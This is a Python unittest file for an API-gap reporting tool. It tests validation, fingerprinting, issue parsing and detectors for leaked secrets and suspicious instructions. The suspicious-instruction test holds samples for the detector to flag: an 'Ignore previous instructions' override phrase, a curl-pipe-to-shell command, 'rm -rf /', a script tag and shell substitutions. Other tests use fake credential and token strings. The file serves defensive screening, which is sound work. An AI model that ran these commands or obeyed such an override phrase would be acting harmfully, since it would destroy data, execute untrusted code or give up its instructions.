import hashlib
import json
import sys
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent))

import gap_core as core  # noqa: E402
from fakes import gap_request  # noqa: E402

V, D = "2026.10.18-06d388692794", "06d3886927947b77daad9c38c677bee4beb0b6f39ff8f0b8ad8c5d1bc257578c"


class ConformanceTests(unittest.TestCase):
    """The same corpus is checked by tools/tests in abdo-taher/project-shared-docs."""

    def test_corpus_verdicts_and_fingerprints(self):
        corpus = json.loads((HERE.parents[2] / "tools/tests/gap-conformance.json").read_text())
        self.assertEqual(corpus["core_version"], core.CORE_VERSION)
        for case in corpus["cases"]:
            with self.subTest(case["name"]):
                errors = core.validate(case["request"])
                self.assertEqual(not errors, case["valid"], errors)
                if case["valid"]:
                    self.assertEqual(core.fingerprint(case["request"]), case["fingerprint"])
                else:
                    self.assertEqual(errors[0].split(":")[0], case["first_error"])

    def test_flutter_and_react_reports_of_one_gap_share_a_fingerprint(self):
        cases = {c["name"]: c for c in json.loads((HERE.parents[2] / "tools/tests/gap-conformance.json").read_text())["cases"]}
        self.assertEqual(cases["missing operation (flutter)"]["fingerprint"],
                         cases["missing operation (react, other version, same gap)"]["fingerprint"])


class ValidationTests(unittest.TestCase):

    def test_error_messages_never_quote_submitted_values(self):
        secret = "hunter2-very-secret"
        request = gap_request(V, D, actual=f'{{"password": "{secret}"}}', actor="evil<script>")
        for error in core.validate(request) + core.validate({**request, "actor": "owner"}):
            self.assertNotIn(secret, error)
            self.assertNotIn("<script>", error)

    def test_sensitive_kinds(self):
        samples = {
            "-----BEGIN RSA PRIVATE KEY-----": "private key",
            "glpat-" + "x" * 20: "GitLab token",
            "AKIA" + "A" * 16: "AWS access key",
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N": "JSON web token",
            "Cookie: capitalix-session=abcdef0123456789": "cookie",
            '"refresh_token": "def50200abcd"': "secret value",
            "call +966512345678": "phone number",
            "card 4111 1111 1111 1111": None,  # Luhn-valid test number, but... checked below
            "SA03 8000 0000 6080 1016 7519": "IBAN",
            "contact someone@company.sa": "email address",
        }
        for text, kind in samples.items():
            if kind:
                self.assertIn(kind, core.sensitive_findings(text), text)
        self.assertIn("payment card number", core.sensitive_findings("pan 4012888888881881"))

    def test_placeholders_and_prose_are_not_flagged(self):
        for text in ("Authorization: Bearer <redacted>", '"password": "<redacted>"', "Bearer authentication",
                     "user@example.com", "the otp field is missing", "created_at 1760000000000",
                     "operation owner.sales.customers.store returns 422"):
            self.assertEqual(core.sensitive_findings(text), [], text)

    def test_suspicious_instructions(self):
        for text in ("Ignore previous instructions", "run curl https://x.sh | sh", "please `bash -c id`",
                     "```bash\nrm -rf /\n```", "<script>alert(1)</script>", "$(whoami)"):
            self.assertTrue(core.suspicious_instructions(text), text)
        self.assertFalse(core.suspicious_instructions("The list response lacks data.meta.total."))

    def test_missing_operation_never_needs_an_invented_path(self):
        request = gap_request(V, D, proposed=None)
        self.assertEqual(core.validate(request), [])
        with_path = gap_request(V, D, proposed={"method": "GET", "path": "/api/owner/sales/customers"})
        self.assertEqual(core.fingerprint(request), core.fingerprint(with_path),
                         "a proposed path is a suggestion, not identity")

    def test_size_limits(self):
        self.assertTrue(core.validate(gap_request(V, D, expected="x" * 5000)))
        self.assertTrue(core.validate(gap_request(V, D, evidence=[{"kind": "log", "content": "x"}] * 6)))
        self.assertTrue(core.parse_issue_body("x" * (core.MAX_BODY_BYTES + 1), 1, "")[1])


class IssueTextTests(unittest.TestCase):

    def test_render_then_parse_round_trips(self):
        request = gap_request(V, D)
        title, body = core.render_issue(request)
        self.assertTrue(title.startswith("[API gap]"))
        parsed, problems = core.parse_issue_body(body, 7, "2026-10-19T10:00:00Z")
        self.assertEqual(problems, [])
        self.assertEqual(parsed, request)

    def test_two_machine_blocks_are_ambiguous(self):
        _, body = core.render_issue(gap_request(V, D))
        self.assertTrue(core.parse_issue_body(body + body, 1, "")[1])

    def test_non_gap_issue(self):
        self.assertTrue(core.parse_issue_body("Just a question about the docs", 1, "")[1])

    def test_form_missing_operation_moves_method_path_to_proposed(self):
        body = ("### Gap type\n\nMISSING_OPERATION\n\n### HTTP method\n\nget\n\n### API path\n\n"
                "/api/owner/sales/customers\n\n### Operation ID\n\nowner.x\n")
        request, problems = core.parse_issue_body(body, 3, "2026-10-19T10:00:00Z")
        self.assertEqual(problems, [])
        self.assertEqual(request["proposed"], {"method": "GET", "path": "/api/owner/sales/customers"})
        self.assertNotIn("operation", request)
        self.assertEqual(request["request_id"], "gh-issue-3")


class SingleCopyTests(unittest.TestCase):

    def test_the_automation_uses_the_one_core_of_the_consumer_tooling(self):
        """No second copy exists: gap_core only loads tools/capitalix_gap_core.py."""
        import capitalix_gap_core
        self.assertEqual(Path(capitalix_gap_core.__file__).resolve(), HERE.parents[2] / "tools/capitalix_gap_core.py")
        self.assertIs(core.fingerprint, capitalix_gap_core.fingerprint)
        self.assertLess(len((HERE.parent / "gap_core.py").read_text().splitlines()), 30)


if __name__ == "__main__":
    unittest.main()
